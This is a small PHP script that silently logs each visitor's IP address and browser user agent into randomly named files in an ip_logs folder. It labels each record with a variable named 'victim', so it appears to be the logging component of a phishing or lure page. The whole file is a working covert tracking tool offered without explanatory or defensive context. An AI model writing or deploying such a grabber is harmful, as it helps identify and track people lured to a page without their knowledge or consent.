<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


if (!is_dir('ip_logs')) {
    mkdir('ip_logs', 0755, true);
}

$rand = substr(md5(uniqid(mt_rand(), true)), 0, 8);
$file = "ip_logs/ip_{$rand}.txt";
$victim = "IP: ";
$fp = fopen($file, 'w');
if ($fp) {
    fwrite($fp, $victim);
    fwrite($fp, $ipaddress);
    fwrite($fp, $useragent);
    fwrite($fp, $browser);
    fclose($fp);
}
?>
